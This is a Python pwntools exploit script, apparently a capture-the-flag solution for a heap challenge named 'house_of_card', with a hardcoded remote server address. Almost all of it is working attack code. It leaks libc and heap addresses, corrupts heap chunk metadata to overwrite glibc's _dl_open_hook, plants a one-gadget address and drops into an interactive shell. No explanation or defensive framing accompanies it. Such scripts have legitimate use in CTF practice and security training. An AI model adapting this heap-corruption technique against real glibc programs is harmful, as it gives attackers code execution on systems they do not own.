#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./house_of_card"
os.environ["LD_LIBRARY_PATH"]="./"
elf=ELF(pwn_file)
libc=elf.libc
heap_address=0

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("178.128.87.12",31336)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("libc address:0x%x"%libc.address)
    log.debug("heap address:0x%x"%heap_address)
    pause()

def add(name,length,desc):
    conn.sendlineafter("Quit\n","1")
    conn.sendlineafter("Name :",name)
    conn.sendlineafter("Len?",str(length))
    if len(desc) == length:
        conn.sendafter("Description:\n",desc)
    else:
        conn.sendlineafter("Description:\n",desc)

def show_all():
    pool=[]
    while True:
        l=conn.recvline()
        print l
        d={}
        if "Back" in l:
            break
        idx=l.find("Name :")+6
        d["name"]=l[idx:-1]
        conn.recvuntil("Description :\n")
        temp=conn.recvuntil("\n\n")[:-2]
        if temp[:2]=="\t\t":
            temp=temp[2:]
        d["desc"]=temp
        pool.append(d)
    return pool

def edit(idx,name,length,desc,line=True):
    conn.sendlineafter("Quit\n","2")
    data=show_all()
    conn.sendlineafter(">",str(idx))
    conn.sendlineafter("New name?",name)
    conn.sendlineafter("Len?",str(length))
    if line:
        conn.sendline(desc)
    else:
        conn.send(desc)
    return data

def dele(idx):
    conn.sendlineafter("Quit\n","3")
    data=show_all()
    conn.sendlineafter(">",str(idx))
    return  data

add("1",0x3e0,"a"*0x3e0)
add("1",0x80,"a"*8)
data=edit(1,"1",0x300,"a")
#libc.address=u64(data[1]["desc"][8:16])-0x3c4b00
libc.address=u64(data[1]["desc"][8:16])-0x3c1b00
add("1",0x100,"a")
add("1",0x100,"a")
add("1",0x100,"a")
add("1",0x100,"a")
dele(4)
dele(4)
add("1",0xe0,"a"*8)
data=dele(3)
heap_address=u64(data[-1]["desc"][8:16])-0x800
dele(1)
dele(1)
dele(1)
dele(1)
add("a",0x410,"a"*0x410)
add("a",0x400,"a"*0x400)
f={
    0x40c:p64(0xdeadbeef)+p64(0x411)+p64(0)+p64(libc.sym["_dl_open_hook"]-0x10)+p64(0)+p64(libc.sym["_dl_open_hook"]-0x20)
}
edit(1,"1",0x411,fit(f,filler="\x00"))
add("a",0x410,"a"*0x410)
edit(2,"1",0x404,"a"*0x3fc+p64(libc.address+0xf24cb))
dele(2)
conn.interactive()
